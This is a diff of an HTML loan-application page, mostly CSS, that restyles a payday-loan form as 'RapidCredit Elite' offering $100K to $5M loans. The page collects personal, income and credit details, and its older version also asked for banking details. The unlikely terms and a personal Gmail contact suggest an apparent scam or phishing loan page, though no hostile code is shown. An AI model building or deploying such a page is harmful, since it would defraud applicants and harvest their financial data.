@@ -3,71 +3,402 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rapid Credit | Fast Cash Loans</title>
+    <title>RapidCredit Elite | $100K+ Business Loans</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* === MODERN FORM STYLES === */
+        /* === PREMIUM $100K LOAN STYLES === */
         :root {
-            --primary: #2563eb;
-            --primary-dark: #1d4ed8;
-            --accent: #f59e0b;
-            --success: #10b981;
-            --dark: #1f2937;
-            --light: #f9fafb;
-            --border: #e5e7eb;
-            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.1);
+            --gold: #FFD700;
+            --gold-dark: #B8860B;
+            --primary: #000080;
+            --primary-dark: #00005C;
+            --accent: #00C896;
+            --dark: #0A0F2B;
+            --light: #FFFFFF;
+            --gray-light: #F8F9FA;
+            --gradient: linear-gradient(135deg, #000080 0%, #4169E1 100%);
+            --gold-gradient: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+            --shadow-xl: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            --shadow-gold: 0 10px 30px rgba(255, 215, 0, 0.3);
         }
-        
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
         }
-        
+
         body {
-            background: linear-gradient(135deg, #f0f9ff 0%, #fef7ff 100%);
+            font-family: 'Plus Jakarta Sans', -apple-system, sans-serif;
+            background: linear-gradient(135deg, #f8f9ff 0%, #f5f7ff 100%);
+            color: var(--dark);
+            line-height: 1.6;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
         }
-        
-        .form-container {
-            width: 100%;
-            max-width: 900px;
+
+        /* === LUXURY CONTAINER === */
+        .luxury-container {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        /* === HEADER === */
+        .luxury-header {
             background: white;
             border-radius: 24px;
-            overflow: hidden;
-            box-shadow: var(--shadow-lg);
-            display: grid;
-            grid-template-columns: 1fr 1.2fr;
-            min-height: 700px;
-        }
-        
-        /* Left Side - Info */
-        .form-info {
-            background: linear-gradient(135deg, var(--primary), #3b82f6);
-            color: white;
-            padding: 50px 40px;
+            padding: 30px 40px;
+            margin-bottom: 30px;
+            box-shadow: var(--shadow-xl);
             display: flex;
-            flex-direction: column;
             justify-content: space-between;
+            align-items: center;
+            border: 2px solid var(--gold);
         }
-        
-        .logo {
+
+        .logo-section {
             display: flex;
             align-items: center;
-            gap: 12px;
+            gap: 20px;
+        }
+
+        .logo-icon {
+            width: 60px;
+            height: 60px;
+            background: var(--gold-gradient);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
             font-size: 28px;
+        }
+
+        .logo-text h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 32px;
+            font-weight: 800;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-text p {
+            color: #666;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .contact-badge {
+            background: var(--gradient);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            box-shadow: var(--shadow-gold);
+        }
+
+        /* === HERO SECTION === */
+        .luxury-hero {
+            background: white;
+            border-radius: 24px;
+            padding: 60px;
+            margin-bottom: 40px;
+            box-shadow: var(--shadow-xl);
+            text-align: center;
+            border: 3px solid var(--gold);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .luxury-hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--gold-gradient);
+        }
+
+        .hero-tag {
+            background: var(--gold-gradient);
+            color: var(--primary);
+            padding: 8px 24px;
+            border-radius: 50px;
             font-weight: 700;
+            font-size: 14px;
+            letter-spacing: 1px;
+            display: inline-block;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .hero-title {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 56px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #000080 0%, #4169E1 50%, #000080 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1.2;
+            margin: 20px 0;
+        }
+
+        .hero-subtitle {
+            font-size: 20px;
+            color: #666;
+            max-width: 700px;
+            margin: 0 auto 40px;
+            line-height: 1.6;
+        }
+
+        /* === PREMIUM STATS === */
+        .premium-stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 30px;
+            margin: 50px 0;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: var(--shadow-xl);
+            border: 2px solid transparent;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: var(--gold-gradient);
+        }
+
+        .stat-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--gold);
+        }
+
+        .stat-number {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 42px;
+            font-weight: 800;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+            margin-bottom: 10px;
+        }
+
+        .stat-label {
+            color: #666;
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* === ELITE APPLICATION FORM === */
+        .elite-form-container {
+            background: white;
+            border-radius: 24px;
+            padding: 50px;
+            margin-bottom: 40px;
+            box-shadow: var(--shadow-xl);
+            border: 3px solid var(--gold);
+            position: relative;
+        }
+
+        .form-header {
+            text-align: center;
             margin-bottom: 40px;
         }
-        
-        .logo i {
+
+        .form-header h2 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 42px;
+            font-weight: 800;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+        }
+
+        .form-header p {
+            color: #666;
+            font-size: 18px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* === LOAN AMOUNT SELECTOR === */
+        .loan-amount-section {
+            background: linear-gradient(135deg, #f8f9ff 0%, #f0f4ff 100%);
+            padding: 40px;
+            border-radius: 20px;
+            margin-bottom: 40px;
+            border: 2px solid var(--primary);
+        }
+
+        .amount-range {
+            margin: 30px 0;
+        }
+
+        .amount-slider {
+            width: 100%;
+            height: 12px;
+            -webkit-appearance: none;
+            background: linear-gradient(to right, #000080, #4169E1);
+            border-radius: 10px;
+            outline: none;
+        }
+
+        .amount-slider::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: var(--gold);
+            cursor: pointer;
+            border: 4px solid white;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+        }
+
+        .amount-display {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .amount-value {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 72px;
+            font-weight: 800;
+            background: var(--gold-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+        }
+
+        .amount-label {
+            color: #666;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+
+        /* === QUICK AMOUNT BUTTONS === */
+        .quick-amounts {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 30px 0;
+        }
+
+        .amount-btn {
+            padding: 20px;
             background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .amount-btn:hover {
+            border-color: var(--primary);
+            transform: translateY(-3px);
+        }
+
+        .amount-btn.active {
+            background: var(--gradient);
+            color: white;
+            border-color: var(--primary);
+            box-shadow: var(--shadow-gold);
+        }
+
+        /* === FORM GRID === */
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: var(--dark);
+            font-size: 15px;
+        }
+
+        .form-label span {
+            color: #ff4757;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 0, 128, 0.1);
+        }
+
+        .form-select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' fill='%23000080' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 20px center;
+            padding-right: 50px;
+        }
+
+        /* === BUSINESS INFO SECTION === */
+        .business-section {
+            background: linear-gradient(135deg, #f0f4ff 0%, #e8eeff 100%);
+            padding: 40px;
+            border-radius: 20px;
+            margin: 40px 0;
+            border-left: 5px solid var(--gold);
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .section-title i {
+            background: var(--gold);
             color: var(--primary);
             width: 50px;
             height: 50px;
@@ -75,724 +406,645 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            font-size: 24px;
         }
-        
-        .info-content h1 {
-            font-size: 36px;
-            line-height: 1.2;
-            margin-bottom: 20px;
-            font-weight: 700;
-        }
-        
-        .info-content p {
-            font-size: 16px;
-            opacity: 0.9;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-        
-        .features {
-            list-style: none;
-            margin: 30px 0;
-        }
-        
-        .features li {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 15px;
-            font-size: 15px;
-        }
-        
-        .features i {
-            color: var(--accent);
-        }
-        
-        .contact-info {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 20px;
-            border-radius: 12px;
-            margin-top: auto;
-        }
-        
-        .contact-info p {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 8px 0;
-        }
-        
-        /* Right Side - Form */
-        .form-content {
-            padding: 50px 40px;
-        }
-        
-        .form-header {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-        
-        .form-header h2 {
-            color: var(--dark);
+
+        .section-title h3 {
+            font-family: 'Space Grotesk', sans-serif;
             font-size: 28px;
             font-weight: 700;
-            margin-bottom: 10px;
-        }
-        
-        .form-header p {
-            color: #6b7280;
-            font-size: 15px;
-        }
-        
-        /* Form Steps */
-        .form-steps {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 40px;
-            position: relative;
-        }
-        
-        .form-steps:before {
-            content: '';
-            position: absolute;
-            top: 15px;
-            left: 20px;
-            right: 20px;
-            height: 2px;
-            background: var(--border);
-            z-index: 1;
-        }
-        
-        .step {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            position: relative;
-            z-index: 2;
-            flex: 1;
-        }
-        
-        .step-number {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: white;
-            border: 2px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 600;
-            color: #9ca3af;
-            margin-bottom: 8px;
-            transition: all 0.3s ease;
-        }
-        
-        .step.active .step-number {
-            background: var(--primary);
-            border-color: var(--primary);
-            color: white;
-        }
-        
-        .step-label {
-            font-size: 12px;
-            color: #9ca3af;
-            font-weight: 500;
-        }
-        
-        .step.active .step-label {
             color: var(--primary);
-            font-weight: 600;
         }
-        
-        /* Form Groups */
-        .form-group {
-            margin-bottom: 24px;
+
+        /* === TERMS SECTION === */
+        .terms-section {
+            background: #f8f9ff;
+            padding: 30px;
+            border-radius: 16px;
+            margin: 40px 0;
+            border: 2px solid #e0e0e0;
         }
-        
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--dark);
-            font-size: 14px;
-        }
-        
-        .form-label span {
-            color: #ef4444;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid var(--border);
-            border-radius: 12px;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            background: white;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
-        }
-        
-        .form-select {
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%236b7280' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 16px center;
-            padding-right: 40px;
-        }
-        
-        /* Amount Selector */
-        .amount-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
-            margin: 15px 0;
-        }
-        
-        .amount-option {
-            padding: 20px 10px;
-            border: 2px solid var(--border);
-            border-radius: 12px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            background: white;
-        }
-        
-        .amount-option:hover {
-            border-color: var(--primary);
-            transform: translateY(-2px);
-        }
-        
-        .amount-option.active {
-            background: var(--primary);
-            border-color: var(--primary);
-            color: white;
-        }
-        
-        .amount-value {
-            font-size: 20px;
-            font-weight: 700;
-            display: block;
-        }
-        
-        .amount-label {
-            font-size: 12px;
-            opacity: 0.8;
-            margin-top: 4px;
-        }
-        
-        /* Two Column Layout */
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-        
-        /* Terms & Conditions */
-        .terms-box {
-            background: #f8fafc;
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 20px;
-            margin: 30px 0;
+
+        .terms-content {
             max-height: 200px;
             overflow-y: auto;
+            padding-right: 20px;
         }
-        
-        .terms-box h4 {
-            color: var(--dark);
-            margin-bottom: 10px;
-            font-size: 14px;
+
+        .terms-content p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 15px;
         }
-        
-        .terms-box p {
-            font-size: 12px;
-            color: #6b7280;
-            line-height: 1.5;
-        }
-        
+
         .checkbox-group {
             display: flex;
             align-items: flex-start;
-            gap: 12px;
-            margin-bottom: 15px;
+            gap: 15px;
+            margin: 20px 0;
         }
-        
+
         .checkbox-group input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            border-radius: 4px;
-            border: 2px solid var(--border);
-            appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 6px;
+            border: 2px solid #ddd;
             cursor: pointer;
             flex-shrink: 0;
             margin-top: 3px;
-            transition: all 0.3s ease;
         }
-        
+
         .checkbox-group input[type="checkbox"]:checked {
             background: var(--primary);
             border-color: var(--primary);
             position: relative;
         }
-        
-        .checkbox-group input[type="checkbox"]:checked:after {
+
+        .checkbox-group input[type="checkbox"]:checked::after {
             content: '✓';
             position: absolute;
             color: white;
-            font-size: 12px;
+            font-size: 14px;
             font-weight: bold;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
         }
-        
+
         .checkbox-group label {
-            font-size: 14px;
-            color: #4b5563;
-            line-height: 1.4;
+            color: #333;
+            font-size: 15px;
+            line-height: 1.5;
         }
-        
+
         .checkbox-group label a {
             color: var(--primary);
+            font-weight: 600;
             text-decoration: none;
-            font-weight: 500;
         }
-        
-        /* Submit Button */
-        .submit-btn {
-            width: 100%;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+
+        /* === SUBMIT BUTTON === */
+        .submit-section {
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .elite-submit-btn {
+            background: var(--gradient);
             color: white;
             border: none;
-            padding: 18px;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
+            padding: 25px 60px;
+            border-radius: 16px;
+            font-size: 20px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
-            display: flex;
+            display: inline-flex;
             align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-        }
-        
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
-        }
-        
-        .submit-btn:active {
-            transform: translateY(0);
-        }
-        
-        /* Progress Bar */
-        .progress-bar {
-            height: 6px;
-            background: var(--border);
-            border-radius: 3px;
-            margin: 30px 0;
+            gap: 15px;
+            position: relative;
             overflow: hidden;
         }
-        
-        .progress-fill {
+
+        .elite-submit-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
             height: 100%;
-            background: linear-gradient(to right, var(--primary), var(--success));
-            width: 33%;
-            border-radius: 3px;
-            transition: width 0.3s ease;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s ease;
         }
-        
-        /* Responsive */
-        @media (max-width: 768px) {
-            .form-container {
-                grid-template-columns: 1fr;
-                max-width: 500px;
-            }
-            
-            .form-info {
-                display: none;
-            }
-            
-            .form-row {
-                grid-template-columns: 1fr;
-            }
-            
-            .amount-grid {
+
+        .elite-submit-btn:hover::before {
+            left: 100%;
+        }
+
+        .elite-submit-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 128, 0.3);
+        }
+
+        /* === FOOTER === */
+        .elite-footer {
+            background: var(--dark);
+            color: white;
+            padding: 60px 0 30px;
+            border-radius: 24px 24px 0 0;
+            margin-top: 60px;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 40px;
+        }
+
+        .footer-column h4 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            color: var(--gold);
+        }
+
+        .footer-column ul {
+            list-style: none;
+        }
+
+        .footer-column ul li {
+            margin-bottom: 12px;
+        }
+
+        .footer-column ul li a {
+            color: #aaa;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-column ul li a:hover {
+            color: var(--gold);
+        }
+
+        .contact-details p {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            color: #ccc;
+        }
+
+        .contact-details i {
+            color: var(--gold);
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 40px;
+            margin-top: 40px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #888;
+            font-size: 14px;
+        }
+
+        /* === RESPONSIVE === */
+        @media (max-width: 1024px) {
+            .premium-stats,
+            .form-grid,
+            .footer-content {
                 grid-template-columns: repeat(2, 1fr);
             }
-        }
-        
-        @media (max-width: 480px) {
-            .form-content {
-                padding: 30px 20px;
+            
+            .quick-amounts {
+                grid-template-columns: repeat(2, 1fr);
             }
             
-            .amount-grid {
+            .hero-title {
+                font-size: 42px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .luxury-header {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            
+            .premium-stats,
+            .form-grid,
+            .footer-content,
+            .quick-amounts {
                 grid-template-columns: 1fr;
+            }
+            
+            .hero-title {
+                font-size: 36px;
+            }
+            
+            .amount-value {
+                font-size: 48px;
+            }
+            
+            .luxury-hero,
+            .elite-form-container {
+                padding: 30px 20px;
             }
         }
     </style>
 </head>
 <body>
 
-    <div class="form-container">
-        <!-- Left Side - Information -->
-        <div class="form-info">
-            <div>
-                <div class="logo">
-                    <i class="fas fa-bolt"></i>
-                    <span>RapidCredit</span>
+    <div class="luxury-container">
+        <!-- Header -->
+        <header class="luxury-header">
+            <div class="logo-section">
+                <div class="logo-icon">
+                    <i class="fas fa-crown"></i>
                 </div>
-                
-                <div class="info-content">
-                    <h1>Get Instant Cash When You Need It</h1>
-                    <p>Apply online in minutes and get approved instantly. Funds deposited within 24 hours.</p>
-                    
-                    <ul class="features">
-                        <li><i class="fas fa-check-circle"></i> Instant approval decision</li>
-                        <li><i class="fas fa-check-circle"></i> No hidden fees</li>
-                        <li><i class="fas fa-check-circle"></i> Secure application</li>
-                        <li><i class="fas fa-check-circle"></i> 24/7 customer support</li>
-                        <li><i class="fas fa-check-circle"></i> Mobile friendly</li>
-                    </ul>
+                <div class="logo-text">
+                    <h1>RapidCredit Elite</h1>
+                    <p>Premium Business & Personal Funding</p>
                 </div>
             </div>
-            
-            <div class="contact-info">
-                <p><i class="fas fa-phone"></i> +1 (305) 574-1900</p>
-                <p><i class="fas fa-envelope"></i> kingrollex4@gmail.com</p>
-                <p><i class="fas fa-clock"></i> Available 24/7</p>
+            <div class="contact-badge">
+                <i class="fas fa-phone"></i>
+                <div>
+                    <div>+1 (305) 574-1900</div>
+                    <small style="font-weight: 400;">Premium Support</small>
+                </div>
             </div>
-        </div>
+        </header>
 
-        <!-- Right Side - Application Form -->
-        <div class="form-content">
+        <!-- Hero Section -->
+        <section class="luxury-hero">
+            <div class="hero-tag">
+                <i class="fas fa-star"></i> ELITE FINANCING
+            </div>
+            <h1 class="hero-title">
+                $100K+ Business & Personal Loans
+            </h1>
+            <p class="hero-subtitle">
+                Access premium capital for your business expansion, real estate investments, 
+                or major personal projects. Competitive rates for qualified applicants.
+            </p>
+
+            <!-- Premium Stats -->
+            <div class="premium-stats">
+                <div class="stat-card">
+                    <div class="stat-number">$100K - $5M</div>
+                    <div class="stat-label">Loan Amounts</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">3.5% - 7.5%</div>
+                    <div class="stat-label">APR Rates</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">5-10 Years</div>
+                    <div class="stat-label">Terms Available</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number">48 Hours</div>
+                    <div class="stat-label">Funding Time</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Elite Application Form -->
+        <section class="elite-form-container">
             <div class="form-header">
-                <h2>Complete Your Application</h2>
-                <p>Fill out the form below to get started</p>
+                <h2>Elite Application</h2>
+                <p>Complete this confidential application for premium financing consideration</p>
             </div>
 
-            <!-- Progress Steps -->
-            <div class="form-steps">
-                <div class="step active">
-                    <div class="step-number">1</div>
-                    <div class="step-label">Loan Details</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-label">Personal Info</div>
-                </div>
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-label">Review & Submit</div>
-                </div>
-            </div>
-
-            <!-- Progress Bar -->
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-
-            <!-- Application Form -->
-            <form id="loanApplication" onsubmit="submitApplication(event)">
+            <form id="eliteApplication" onsubmit="submitEliteApplication(event)">
                 <!-- Loan Amount Section -->
-                <div class="form-group">
-                    <label class="form-label">Loan Amount Needed <span>*</span></label>
-                    <div class="amount-grid">
-                        <div class="amount-option active" data-amount="300">
-                            <span class="amount-value">$300</span>
-                            <span class="amount-label">Small</span>
-                        </div>
-                        <div class="amount-option" data-amount="500">
-                            <span class="amount-value">$500</span>
-                            <span class="amount-label">Popular</span>
-                        </div>
-                        <div class="amount-option" data-amount="1000">
-                            <span class="amount-value">$1,000</span>
-                            <span class="amount-label">Large</span>
-                        </div>
-                        <div class="amount-option" data-amount="1500">
-                            <span class="amount-value">$1,500</span>
-                            <span class="amount-label">Maximum</span>
-                        </div>
-                    </div>
-                    <input type="hidden" id="loanAmount" name="loan_amount" value="300" required>
-                </div>
-
-                <div class="form-row">
-                    <div class="form-group">
-                        <label class="form-label">Purpose of Loan <span>*</span></label>
-                        <select class="form-input form-select" name="purpose" required>
-                            <option value="">Select Purpose</option>
-                            <option value="Emergency">Emergency Expense</option>
-                            <option value="Medical">Medical Bills</option>
-                            <option value="Car">Car Repair</option>
-                            <option value="Rent">Rent Payment</option>
-                            <option value="Utilities">Utility Bills</option>
-                            <option value="Other">Other</option>
-                        </select>
+                <div class="loan-amount-section">
+                    <h3 style="color: var(--primary); margin-bottom: 20px; font-size: 24px;">
+                        <i class="fas fa-money-bill-wave"></i> Requested Loan Amount
+                    </h3>
+                    
+                    <div class="amount-range">
+                        <input type="range" id="loanSlider" class="amount-slider" min="100000" max="5000000" step="50000" value="250000">
                     </div>
                     
-                    <div class="form-group">
-                        <label class="form-label">Repayment Period <span>*</span></label>
-                        <select class="form-input form-select" name="repayment" required>
-                            <option value="">Select Period</option>
-                            <option value="7">7 Days</option>
-                            <option value="14" selected>14 Days</option>
-                            <option value="30">30 Days</option>
-                            <option value="60">60 Days</option>
-                        </select>
+                    <div class="amount-display">
+                        <div class="amount-value" id="amountDisplay">$250,000</div>
+                        <div class="amount-label">Move slider to adjust amount</div>
                     </div>
+
+                    <!-- Quick Amount Buttons -->
+                    <div class="quick-amounts">
+                        <button type="button" class="amount-btn" data-amount="100000">$100K</button>
+                        <button type="button" class="amount-btn" data-amount="250000">$250K</button>
+                        <button type="button" class="amount-btn active" data-amount="500000">$500K</button>
+                        <button type="button" class="amount-btn" data-amount="1000000">$1M</button>
+                    </div>
+                    
+                    <input type="hidden" id="loanAmount" name="loan_amount" value="500000" required>
                 </div>
 
                 <!-- Personal Information -->
-                <div class="form-row">
+                <div class="form-grid">
                     <div class="form-group">
                         <label class="form-label">First Name <span>*</span></label>
-                        <input type="text" class="form-input" name="first_name" placeholder="John" required>
+                        <input type="text" class="form-input" name="first_name" placeholder="Enter first name" required>
                     </div>
                     
                     <div class="form-group">
                         <label class="form-label">Last Name <span>*</span></label>
-                        <input type="text" class="form-input" name="last_name" placeholder="Smith" required>
+                        <input type="text" class="form-input" name="last_name" placeholder="Enter last name" required>
                     </div>
-                </div>
-
-                <div class="form-row">
+                    
                     <div class="form-group">
                         <label class="form-label">Email Address <span>*</span></label>
-                        <input type="email" class="form-input" name="email" placeholder="john@example.com" required>
+                        <input type="email" class="form-input" name="email" placeholder="your@email.com" required>
                     </div>
                     
                     <div class="form-group">
                         <label class="form-label">Phone Number <span>*</span></label>
-                        <input type="tel" class="form-input" name="phone" placeholder="(555) 123-4567" required>
+                        <input type="tel" class="form-input" name="phone" placeholder="+1 (XXX) XXX-XXXX" required>
                     </div>
-                </div>
-
-                <div class="form-row">
+                    
                     <div class="form-group">
-                        <label class="form-label">State <span>*</span></label>
-                        <select class="form-input form-select" name="state" required>
-                            <option value="">Select State</option>
-                            <option value="FL">Florida</option>
-                            <option value="CA">California</option>
-                            <option value="TX">Texas</option>
-                            <option value="NY">New York</option>
-                            <option value="IL">Illinois</option>
+                        <label class="form-label">Annual Income <span>*</span></label>
+                        <select class="form-input form-select" name="annual_income" required>
+                            <option value="">Select Income Range</option>
+                            <option value="100k-250k">$100,000 - $250,000</option>
+                            <option value="250k-500k">$250,000 - $500,000</option>
+                            <option value="500k-1m">$500,000 - $1,000,000</option>
+                            <option value="1m-5m">$1,000,000 - $5,000,000</option>
+                            <option value="5m+">$5,000,000+</option>
                         </select>
                     </div>
                     
                     <div class="form-group">
-                        <label class="form-label">Monthly Income <span>*</span></label>
-                        <select class="form-input form-select" name="income" required>
-                            <option value="">Select Income</option>
-                            <option value="<1000">Under $1,000</option>
-                            <option value="1000-2000">$1,000 - $2,000</option>
-                            <option value="2000-3000">$2,000 - $3,000</option>
-                            <option value="3000-4000">$3,000 - $4,000</option>
-                            <option value=">4000">Over $4,000</option>
+                        <label class="form-label">Credit Score <span>*</span></label>
+                        <select class="form-input form-select" name="credit_score" required>
+                            <option value="">Select Credit Score</option>
+                            <option value="excellent">Excellent (750+)</option>
+                            <option value="good">Good (700-749)</option>
+                            <option value="fair">Fair (650-699)</option>
+                            <option value="other">Other</option>
                         </select>
                     </div>
                 </div>
 
-                <div class="form-group">
-                    <label class="form-label">Employment Status <span>*</span></label>
-                    <select class="form-input form-select" name="employment" required>
-                        <option value="">Select Status</option>
-                        <option value="Full-Time">Employed Full-Time</option>
-                        <option value="Part-Time">Employed Part-Time</option>
-                        <option value="Self">Self-Employed</option>
-                        <option value="Unemployed">Currently Unemployed</option>
-                        <option value="Retired">Retired</option>
-                    </select>
-                </div>
-
-                <!-- Banking Information -->
-                <div class="form-group">
-                    <label class="form-label">Bank Name <span>*</span></label>
-                    <input type="text" class="form-input" name="bank_name" placeholder="e.g., Chase, Bank of America" required>
-                </div>
-
-                <div class="form-row">
-                    <div class="form-group">
-                        <label class="form-label">Account Type <span>*</span></label>
-                        <select class="form-input form-select" name="account_type" required>
-                            <option value="">Select Type</option>
-                            <option value="Checking">Checking Account</option>
-                            <option value="Savings">Savings Account</option>
-                        </select>
+                <!-- Business Information -->
+                <div class="business-section">
+                    <div class="section-title">
+                        <i class="fas fa-briefcase"></i>
